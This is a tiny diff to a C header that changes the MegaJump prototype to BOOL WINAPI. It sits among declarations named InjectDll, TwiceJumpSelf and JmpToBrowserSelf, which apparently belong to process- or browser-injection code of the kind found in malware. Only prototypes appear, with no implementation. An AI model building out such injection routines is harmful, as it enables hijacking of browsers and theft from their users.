@@ -21,7 +21,7 @@ bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) );
 
 bool InjectDll( WCHAR *DllPath );
 
-bool MegaJump( DWORD (WINAPI f_Main)(LPVOID) );
+BOOL WINAPI MegaJump( DWORD (WINAPI f_Main)(LPVOID) );
 
 
 bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) );
